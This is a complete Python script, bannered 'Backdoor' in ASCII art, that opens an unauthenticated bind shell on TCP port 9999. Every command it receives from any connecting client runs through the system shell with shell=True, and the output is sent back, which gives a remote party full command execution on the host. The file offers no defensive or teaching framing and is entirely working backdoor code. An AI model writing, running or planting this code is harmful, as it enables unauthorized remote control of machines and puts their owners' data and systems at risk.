import socket
import subprocess
import os
import threading
import time

def countdown(seconds):
    for i in range(seconds, 0, -1):
        print(f"Server starting in {i} seconds...", end="\r")
        time.sleep(1)
    print("Server starting now...")

def handle_client(clientsocket):
    print(r"""
  ____             _       _                  
 |  _ \           | |     | |                 
 | |_) | __ _  ___| | ____| | ___   ___  _ __ 
 |  _ < / _` |/ __| |/ / _` |/ _ \ / _ \| '__|
 | |_) | (_| | (__|   < (_| | (_) | (_) | |   
 |____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|   
                                              
                                              
 """)

    while True:
        try:
            command = clientsocket.recv(1024).decode()
            if not command:
                break
            
            if command.startswith("cd "):
                try:
                    directory = command[3:]
                    os.chdir(directory)
                    response = f"Changed directory to {directory}"
                except Exception as e:
                    response = str(e)
            else:
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
                    response = output.decode()
                except subprocess.CalledProcessError as e:
                    response = str(e.output.decode())

            clientsocket.send(response.encode())
        except socket.timeout:
            print("No incoming packets for a long period of time")
            break
    
    clientsocket.close()

def main():
    serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = socket.gethostname()
    port = 9999

    serversocket.bind((host, port))

    countdown_thread = threading.Thread(target=countdown, args=(5,))
    countdown_thread.start()

    serversocket.listen(5)
    countdown_thread.join()  
    print(f"Server listening on {host}:{port}")

    while True:
        clientsocket, addr = serversocket.accept()
        clientsocket.settimeout(60) 
        
        print(f"Connection from {addr}")

        client_handler = threading.Thread(target=handle_client, args=(clientsocket,))
        client_handler.start()

if __name__ == "__main__":
    main()
